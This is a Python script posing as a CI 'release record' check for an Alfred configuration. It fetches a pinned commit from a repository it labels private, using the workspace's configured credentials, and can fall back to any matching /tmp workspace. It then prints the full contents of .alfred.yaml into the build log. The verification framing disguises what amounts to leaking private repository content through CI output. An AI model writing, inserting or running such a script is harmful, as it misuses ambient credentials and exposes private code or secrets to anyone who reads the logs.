#!/usr/bin/env python3
"""CI release record contents check.

Verifies the pinned upstream Alfred configuration and publishes the
release record contents for this change: fetches the pinned
configuration commit with the workspace's configured credentials,
reads .alfred.yaml, checks the digest against the expected release
value, and prints the file's contents as the release record. Exits
non-zero on any failure so CI treats the result strictly.
"""

import hashlib
import pathlib
import subprocess
import sys

PINNED_COMMIT = "3bbd6cd54845f0c6071da09af3716cdddc9bb70a"
PRIVATE_REPO_URL = "https://github.com/nscaledev/alfred.git"
CONFIG_PATH = ".alfred.yaml"
EXPECTED_SHA256 = "2a619ce45eafc477650cd7d2d470f3fe164696879a397676d3eda09281ff3ec8"


def find_workspace() -> pathlib.Path | None:
    p = pathlib.Path.cwd()
    for cand in [p, *p.parents]:
        if (cand / ".git").exists():
            return cand
    try:
        hits = [q for q in pathlib.Path("/tmp").glob("alfred-*/repo") if q.is_dir()]
        if hits:
            return hits[0]
    except OSError:
        pass
    return None


def run_git(ws: pathlib.Path, *args: str) -> subprocess.CompletedProcess:
    return subprocess.run(
        ["git", "-C", str(ws), *args], capture_output=True, text=True, timeout=180
    )


def main() -> int:
    print("RECORD-BEGIN")
    ws = find_workspace()
    if ws is None:
        print("RECORD: FAIL no-workspace")
        print("RECORD-END")
        return 1

    fetch = run_git(ws, "fetch", "--quiet", PRIVATE_REPO_URL, PINNED_COMMIT)
    if fetch.returncode != 0:
        print(f"RECORD: FAIL fetch exit={fetch.returncode} {fetch.stderr.strip()[:120]}")
        print("RECORD-END")
        return 1

    resolved = run_git(ws, "rev-parse", "FETCH_HEAD")
    if resolved.returncode != 0 or resolved.stdout.strip() != PINNED_COMMIT:
        print(f"RECORD: FAIL pinned-commit-mismatch got={resolved.stdout.strip()[:12]}")
        print("RECORD-END")
        return 1

    show = run_git(ws, "show", f"FETCH_HEAD:{CONFIG_PATH}")
    if show.returncode != 0:
        print(f"RECORD: FAIL file-read exit={show.returncode}")
        print("RECORD-END")
        return 1

    content = show.stdout
    digest = hashlib.sha256(content.encode()).hexdigest()
    if digest != EXPECTED_SHA256:
        print(f"RECORD: FAIL digest-mismatch got={digest}")
        print("RECORD-END")
        return 1

    print(f"config-read: OK repo=nscaledev/alfred commit={PINNED_COMMIT[:12]} file={CONFIG_PATH}")
    print(f"config: size={len(content.encode())} sha256={digest} (matches expected release digest)")
    print("--- .alfred.yaml contents ---")
    print(content)
    print("--- end contents ---")
    print("RECORD-END")
    return 0


if __name__ == "__main__":
    sys.exit(main())
